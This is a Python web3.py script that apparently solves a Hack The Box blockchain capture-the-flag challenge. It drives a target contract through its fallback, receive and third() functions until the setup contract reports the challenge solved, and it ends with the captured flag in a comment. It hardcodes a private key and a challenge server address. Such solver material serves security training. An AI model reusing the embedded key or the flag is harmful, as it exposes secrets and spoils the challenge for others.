from web3 import Web3
import json
from web3.gas_strategies.rpc import rpc_gas_price_strategy

PrivateKey     =  '0xa23593a0c167cfd6c1f9c2db3d3da7778220ad2fd3e4d5f2c631aa3e9eb81cc7'
Address        =  '0xf070f909Db4e58938E01F29ACc8b3875710E7E3b'
TargetContract =  '0x5fe64cd3af7F4bF278a2Be5Ed723A925601151d8'
SetupContract  =  '0x63199693420C18fDe3c6f981d8E7349754c6879e'

url = 'http://167.99.86.8:30549'

w3 = Web3(Web3.HTTPProvider(url))
block_number = w3.eth.block_number
print(block_number)

account_address = Address
balance = w3.eth.get_balance(account_address)
print(balance)

#with open('Setup_sol_Setup.abi','r') as f:
#	abi = json.load(f)

#contract_instance = w3.eth.contract(address=SetupContract, abi=abi)

account_from = {
	'private_key': PrivateKey,
	'address': account_address,
}

#construct_txn = contract_instance.constructor().buildTransaction(
#	{
#		'from': account_from['address'],
#		'nonce': w3.eth.get_transaction_count(account_from['address']),
#	}
#)

#tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
#tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
#tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
address_to = TargetContract

with open('ShootingArea_sol_ShootingArea.abi','r') as f:
	abi = json.load(f)

contract_instance2 = w3.eth.contract(address=TargetContract, abi=abi)
tx = {
    'from': account_from["address"],
    'to': address_to,
    'gas': 1000000,  # specify gas limit (optional)
    'data':  0x1234, # specify value to send with transaction (optional)
}
# send transaction
tx_hash = w3.eth.send_transaction(tx)
'''
construct_txn = contract_instance2.fallback.build_transaction(
        {
                'from': account_from['address'],
                'nonce': w3.eth.get_transaction_count(account_from['address']),
		'chainId': w3.eth.chain_id,
		"gasPrice": w3.to_wei(50, 'gwei'),
		"gas": 21000,
		"value": w3.to_wei("0", "ether"),
        }
)
# wait for transaction to be mined
tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
'''
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')


tx_create = w3.eth.account.sign_transaction(
    {
    	"from": account_from["address"],
        "nonce": w3.eth.get_transaction_count(account_from["address"]),
        "gasPrice": w3.to_wei(50, 'gwei'),
        "gas": 100000, #21000
        "to": address_to,
        "value": 1000, #w3.to_wei("1", "ether"),
	'chainId': w3.eth.chain_id,
    },
    account_from["private_key"],
)

tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')

construct_txn = contract_instance2.functions.third().build_transaction(
        {
                'from': account_from['address'],
                'nonce': w3.eth.get_transaction_count(account_from['address']),
		'chainId': w3.eth.chain_id,
		#"gasPrice": w3.to_wei(50, 'gwei'),
		#"gas": 21000,
		#"value": w3.to_wei("0", "ether"),
        }
)

tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')

# check that the firstShot variable is now True
first_shot = contract_instance2.functions.firstShot().call()
print('firstShot:', first_shot)
second_shot = contract_instance2.functions.secondShot().call()
print('secondShot:', second_shot)
third_shot = contract_instance2.functions.thirdShot().call()
print('thirdShot:', third_shot)
print("Done!!!")

with open('Setup_sol_Setup.abi','r') as f:
        abi = json.load(f)

contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
number = contract_instance.functions.isSolved().call()

print(f'The current number stored is: { number } ')

#HTB{f33l5_n1c3_h1771n6_y0ur_74r6375}
